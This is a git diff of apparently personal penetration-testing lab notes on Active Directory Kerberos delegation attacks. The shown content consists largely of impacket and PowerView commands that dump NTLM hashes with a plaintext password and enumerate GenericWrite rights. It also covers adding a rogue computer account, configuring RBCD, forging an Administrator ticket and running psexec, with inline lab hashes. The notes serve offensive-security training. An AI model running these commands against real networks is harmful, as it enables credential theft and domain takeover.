@@ -60,7 +60,7 @@ nslookup appsrv01
           <figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 
-      * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png>)
+      * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png>)
         *   ```powershell
             # Dump as domain user
             impacket-secretsdump CORP/adam:4Toolsfigure3@192.168.101.104
@@ -153,7 +153,7 @@ nslookup appsrv01
     </strong><strong>Get-DomainUser -TrustedToAuth
     </strong></code></pre>
 
-    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * Contained delegation is configured on IISSvc and it is only allowed to MSSQLSvc
@@ -196,7 +196,7 @@ nslookup appsrv01
 
 ## Exploitation 3
 
-![](<../.gitbook/assets/image (3) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1).png>)
 
 * Obtain a Ticket Granting Ticket (TGT) for the Service Account
   *   ```powershell
@@ -244,36 +244,46 @@ nslookup appsrv01
 * Backend service controls which frontend services can delegate on behalf of users
 * Attack against RBCD needs to happen from a computer account or a service account with a SPN
 
-- Find which computers we can modify using GenericWrite permissions
+### Enumeration
+
+* Find which computers we can modify using GenericWrite permissions
   *   ```powershell
       Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }
       ```
 
 
   * OR Specifying domain
-    * ```powershell
-      Get-DomainComputer -Domain ops.comply.com | Get-ObjectAcl -ResolveGUIDs | Foreach-Object { $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }
-      ```
-- Add a New Computer Account (myComputer$) to the Domain
+    *   ```powershell
+        Get-DomainComputer -Domain ops.comply.com | Get-ObjectAcl -ResolveGUIDs | Foreach-Object { $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }
+        ```
+
+
+
+### Exploitation
+
+* Add a New Computer Account (myComputer$) to the Domain
   *   ```powershell
       impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
       # impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' ops.comply.com/FILE06$ -hashes :c81c9...
+      # impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' COWMOTORS-INT.COM/TERENCE.FORD -k -no-pass -dc-host=dc02.cowmotors-int.com
       ```
 
 
-- Configure RBCD on the Target Machine (BACKUP01$)
+* Configure RBCD on the Target Machine (BACKUP01$)
   *   ```powershell
       impacket-rbcd -action write -delegate-to "BACKUP01$" -delegate-from "myComputer$" corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
+      # impacket-rbcd -k -no-pass -action write -delegate-to "web01$" -delegate-from "myComputer$" COWMOTORS-INT.COM/TERENCE.FORD
       ```
 
 
-- Obtain a Service Ticket (ST) as Administrator
+* Obtain a Service Ticket (ST) as Administrator
   *   ```powershell
       impacket-getST -spn cifs/backup01.corp.com -impersonate administrator 'corp.com/myComputer$:h4x'
+      # impacket-getST -spn 'cifs/web01.cowmotors-int.com' -impersonate Administrator -dc-ip 'dc02.cowmotors-int.com' 'cowmotors-int/myComputer$:h4x'
       ```
 
 
-- Execute Commands as Administrator
+* Execute Commands as Administrator
   *   <pre class="language-powershell"><code class="lang-powershell"><strong>mv Administrator@cifs_backup01.corp.com@CORP.COM.ccache administrator.ccache
       </strong>export KRB5CCNAME=/home/kali/Documents/offsec/challenges/7/administrator.ccache
       impacket-psexec administrator@backup01.corp.com -k -no-pass
